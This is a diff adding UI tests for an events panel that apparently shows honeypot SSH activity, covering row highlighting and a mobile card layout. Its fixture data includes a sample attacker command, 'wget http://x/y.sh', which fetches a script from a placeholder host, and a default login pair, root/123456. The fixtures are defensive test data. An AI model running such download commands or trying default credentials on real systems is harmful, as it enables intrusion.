@@ -520,6 +520,44 @@ describe("EventsPanel", () => {
     expect(root.className).toMatch(/\bh-full\b/);
   });
 
+  const EVENTS = [
+    { timestamp: "2026-08-16T10:00:00Z", src_ip: "1.1.1.1", dest_port: 22,
+      username: null, password: null, command: null, session_id: "a", country_iso: "CN" },
+    { timestamp: "2026-08-16T10:00:05Z", src_ip: "2.2.2.2", dest_port: 22,
+      username: "root", password: "123456", command: null, session_id: "b", country_iso: "CN" },
+    { timestamp: "2026-08-16T10:00:10Z", src_ip: "3.3.3.3", dest_port: 22,
+      username: null, password: null, command: "wget http://x/y.sh", session_id: "c", country_iso: "CN" },
+  ];
+
+  it("weights rows by what actually happened", () => {
+    // Most rows are a bot connecting and trying one password. The few that ran
+    // commands used to look identical, which buried the only interesting thing
+    // on the page in a hundred rows of noise.
+    const { container } = render(<EventsPanel {...props} events={EVENTS} />);
+    const rows = [...container.querySelectorAll("tbody tr")];
+    expect(rows).toHaveLength(3);
+    const [connect, login, command] = rows;
+    expect(connect.className).toMatch(/opacity-55/);
+    expect(login.className).not.toMatch(/opacity-55/);
+    expect(command.className).toMatch(/bg-emerald-500/);
+    expect(command.className).not.toMatch(/opacity-55/);
+  });
+
+  it("drops the table for cards on a phone", () => {
+    // A seven-column nowrap table on a 390px screen is a side-scrolling strip.
+    const { container } = render(<EventsPanel {...props} events={EVENTS} isMobile />);
+    expect(container.querySelector("table")).toBeNull();
+    expect(screen.getByText("wget http://x/y.sh")).toBeInTheDocument();
+    expect(screen.getByText("root / 123456")).toBeInTheDocument();
+    expect(screen.getByText(/connection only/)).toBeInTheDocument();
+  });
+
+  it("does not force a minimum width that would overflow a narrow phone", () => {
+    // min-w-[320px] plus page padding overflows a 320px viewport.
+    const { container } = render(<EventsPanel {...props} isMobile />);
+    expect(container.firstChild.className).not.toMatch(/min-w-\[/);
+  });
+
   it("renders an event row", () => {
     render(<EventsPanel {...props} />);
     expect(screen.getByText("1.2.3.4")).toBeInTheDocument();
